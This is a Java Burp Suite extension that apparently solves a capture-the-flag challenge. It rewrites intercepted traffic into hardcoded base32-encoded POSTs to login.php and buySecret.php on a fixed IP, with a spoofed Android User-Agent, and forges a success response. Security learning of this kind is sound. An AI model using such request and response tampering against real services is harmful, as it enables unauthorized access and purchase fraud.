package burp;

import java.io.PrintWriter;

public class BurpExtender implements IBurpExtender, IHttpListener
{
    private PrintWriter stdout;
    private IExtensionHelpers helpers;
    private int req_count=0;
    private int resp_count=0;

    //
    // implement IBurpExtender and IHttpListener
    //

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("Your Extension's name");
        // print logs here
        stdout = new PrintWriter(callbacks.getStdout(), true);
        // register ourselves as an HTTP listener
        callbacks.registerHttpListener(this);


    }

    //
    // implement IHttpListener
    //

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
    {
        // process request
        if (messageIsRequest)
        {
            stdout.println("Request");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort() );
            // print out the request
            //此方法用于获取当前消息的HTTP请求
            String req = new String(messageInfo.getRequest() );

            // you can modify the request like this
//            req="OVZWK4TOMFWWKPKHKVCVGVBGOBQXG43XN5ZGIPKUIVGVAX2QIFJVGV2E";

            if(req_count%2==0) {
                req = "POST /login.php HTTP/1.1\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011)\n" +
                        "Host: 106.15.186.69:9800\n" +
                        "Connection: close\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Content-Length: 60\n" +
                        "\n" +
                        "OVZWK4TOMFWWKPKHKVCVGVBGOBQXG43XN5ZGIPKUIVGVAX2QIFJVGV2E";
                req_count++;

            }

            if(req_count%2==1){
                req="POST /buySecret.php HTTP/1.1\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G973N Build/PPR1.190810.011)\n" +
                        "Host: 106.15.186.69:9800\n" +
                        "Connection: close\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Content-Length: 70\n" +
                        "\n" +
                        "msg=OVZWK4S7NFSD2MRQGMYDOMJTGAZTKMBGNVXW4ZLZHUYTAMBQGATGS427MZQWWZJ5GA";

            }
            stdout.println("request " + req);
            messageInfo.setRequest(req.getBytes() );
        }


        // process response
        if (!messageIsRequest)
        {
            stdout.println("Response");
            // get the HTTP service for the request
            IHttpService httpService = messageInfo.getHttpService();
            // print out the host
            stdout.println("host " + httpService.getHost() + ":" + httpService.getPort() );
            // print out the response
            String resp = new String(messageInfo.getResponse() );

            if(resp_count%2==0) {
                resp = "HTTP/1.1 200 OK\n" +
                        "Server: nginx/1.16.1\n" +
                        "Date: Mon, 04 Apr 2022 03:56:31 GMT\n" +
                        "Content-Type: text/html; charset=UTF-8\n" +
                        "Connection: close\n" +
                        "X-Powered-By: PHP/7.4.5\n" +
                        "Content-Length: 167\n" +
                        "\n" +
                        "PMRHEZLTOVWHIIR2GEWCE3LFONZWCZ3FEI5CE43VMNRWK43TEIWCE2LEEI5CEMRQGMYDOMJTGAZTKMBCFQRFGZLDOJSXIMJCHIRGM3DBM55WKNBTPFPXANDDNMZTOX3TNYYWMZRRJZTX2IRMEJWW63TFPERDUMJQGAYDA7I\n";
                resp_count++;
            }


            stdout.println("response " + resp);
            // you can modify the request like this
            messageInfo.setResponse(resp.getBytes());
        }
    }

}